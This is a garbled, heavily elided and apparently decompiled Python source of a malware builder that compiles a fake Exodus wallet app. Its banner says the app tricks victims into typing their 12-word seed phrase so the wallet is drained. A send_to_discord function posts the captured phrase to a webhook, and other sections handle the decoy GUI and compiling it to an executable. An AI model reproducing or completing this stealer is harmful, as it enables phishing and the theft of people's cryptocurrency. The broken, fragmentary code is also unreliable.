...
class ExodusBuilder:
    ...
    def get_user_input(self):
        ...
        print(RED + '[+] Fake Exodus wallet GUI u2013 tricks victim into entering 12-word seed phrase')
        ...
        print(RED + '[+] Custom icon & background from \'input\' folder u2013 perfect social engineering')
        print(RED + '[+] Victim thinks it\'s real Exodus u2013 your wallet gets drained instantly\n')
        print(RED + '[+] =========================================================================================\n')
    ...
    def build_exodus(self):
        # ***<module>.ExodusBuilder.build_exodus: Failure: Compilation Error
        ...
        if not os.path.exists(icon_path):
            print(RED + '[-] WARNING: icon.ico not found u2013 compiling without icon')
            icon_option = []
        else:
            print(RED + '[+] Icon found: {icon_path}')
...
# -------------------------
# DEGRADE VIOLET DOUX ANIME POUR LA FLECHE
# -------------------------
arrow_x = 845
arrow_y = (406 + 481) // 2
...
def animate_gradient():
    ...
    for i in range(arrow_w):
        ...
        arrow.create_line(i, 0, i, arrow_h, fill="#{{:02x}}{{:02x}}{{:02x}}".format(r, g, b))
...
def draw_gradient(canvas, w, h, start, end):
    ...
    for i in range(w):
        ...
        canvas.create_line(i, 0, i, h, fill="#{{:02x}}{{:02x}}{{:02x}}".format(r, g, b))
...
def send_to_discord():
    ...
    payload = {{"content": "**Secret Phrase:** {{}}".format(phrase)}}
...
""".format(self.webhook_url))
        try:
            ...
            print(RED + '[*] Warning: Could not set attributes for temp file: {str(e)}')
        ...
        print(RED + "[+] Command: {' '.join(command)}")
        ...
        if os.path.exists(dist_exe):
            ...
            print(RED + '[+] Exodus compiled successfully: {output_exe}')
        else:
